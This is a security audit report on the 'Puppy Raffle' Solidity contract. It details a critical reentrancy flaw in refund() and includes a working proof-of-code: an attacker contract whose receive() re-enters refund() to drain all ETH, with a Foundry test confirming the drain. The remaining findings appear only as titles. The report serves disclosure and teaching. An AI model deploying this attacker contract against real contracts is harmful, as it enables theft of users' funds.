# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle** is an on-chain raffle that lets anyone win a collectible Puppy NFT while sharing ETH prize money with a fee recipient.

• Players call `enterRaffle(address[] newPlayers)` and send `entranceFee` (1 ETH by default) for _each_ supplied address. The contract rejects duplicate entries and under-payment, keeping a clean `players` array.

• At any time before a winner is drawn a player may invoke `refund(uint256 index)` to cancel their ticket and reclaim the full fee, automatically removing their slot.

• Once `raffleDuration` (1 day in the deployment script) has elapsed **and** at least four unique players exist, anyone can call `selectWinner()`. A pseudo-random index is chosen, the winner is minted an ERC-721 Puppy whose metadata encodes rarity (common, rare, legendary), and receives the pooled ETH minus a protocol fee.

• Collected fees accumulate in `totalFees`; the owner can `withdrawFees()` and can update the `feeAddress` via `changeFeeAddress()`.

• The accompanying Foundry tests exhaustively cover entry logic, refunds, winner selection, NFT URI accuracy, and fee withdrawal, while `DeployPuppyRaffle.sol` automates deployment with preset parameters.

The result is a transparent, trust-minimized raffle with provable NFT rewards and built-in revenue sharing.
## Critical Risk Findings
[C-1]. Reentrancy issue found with Critical severity
## High Risk Findings
[H-1]. DOS issue found with High severity
[H-2]. Randomness issue found with High severity
## Medium Risk Findings
[M-1]. DOS issue found with Medium severity


### Number of Findings
- C: 1
- H: 2
- M: 1
- L: 0
- I: 0



# Critical Risk Findings

## [C-1]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to a user before updating the state that validates the refund. Specifically, the line `players[playerIndex] = address(0);` is executed after `payable(msg.sender).sendValue(entranceFee);`. The `sendValue` function uses a low-level `.call` which forwards all available gas, making a reentrancy attack possible. An attacker can create a contract with a `receive()` fallback function that calls `refund()` again. Since the `players` array has not been updated, the checks will pass, and the attacker will receive another refund. This loop can be repeated until the contract's entire ETH balance is drained.

## Impact
An attacker can drain all ETH deposited by players into the raffle, leading to a direct theft of user funds. The entire prize pool is at risk.

## Proof of Concept
1. Several legitimate users enter the raffle, funding the contract with their entrance fees.
2. An attacker deploys a malicious contract and uses it to enter the raffle once.
3. The attacker then calls `refund()` from their malicious contract.
4. The `PuppyRaffle` contract starts sending the refund ETH, triggering the attacker's `receive()` function.
5. Inside `receive()`, the attacker's contract immediately calls `refund()` on `PuppyRaffle` again.
6. Because the `players` array has not yet been modified for the attacker's index, the re-entrant call succeeds, and another refund is sent.
7. This process repeats, draining all available ETH from the `PuppyRaffle` contract into the attacker's contract.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract MaliciousRefund {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 public attacks;

    constructor(PuppyRaffle _raffle) payable {
        raffle = _raffle;
        entranceFee = _raffle.entranceFee();
    }

    // kick-off
    function trigger() external {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(arr);
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        attacks++;
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        if (address(raffle).balance >= entranceFee && raffle.players(idx) == address(this)) {
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 entranceFee = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(entranceFee, address(0xFEE), 1 days);
    }

    function _arr(address a) internal pure returns (address[] memory arr) {
        arr = new address[](1);
        arr[0] = a;
    }

    function testRefundReentrancy() public {
        // seed contract with 3 honest players
        address alice = address(0x1);
        address bob   = address(0x2);
        address carol = address(0x3);
        vm.deal(alice, 2 ether);
        vm.deal(bob,   2 ether);
        vm.deal(carol, 2 ether);

        vm.prank(alice); raffle.enterRaffle{value: entranceFee}(_arr(alice));
        vm.prank(bob);   raffle.enterRaffle{value: entranceFee}(_arr(bob));
        vm.prank(carol); raffle.enterRaffle{value: entranceFee}(_arr(carol));

        // deploy attacker funded with one ticket
        MaliciousRefund attacker = new MaliciousRefund{value: entranceFee}(raffle);
        uint256 attackerStartBal = address(attacker).balance;
        uint256 raffleStartBal   = address(raffle).balance;

        // launch attack
        attacker.trigger();

        // attacker drained everything
        assertEq(address(raffle).balance, 0);
        assertEq(address(attacker).balance, raffleStartBal + attackerStartBal);
        assertGt(attacker.attacks(), 1);
    }
}

## Suggested Mitigation
Follow Checks-Effects-Interactions: set `players[playerIndex] = address(0);` before transferring funds OR add `nonReentrant` modifier from OpenZeppelin’s `ReentrancyGuard` to the `refund` function.



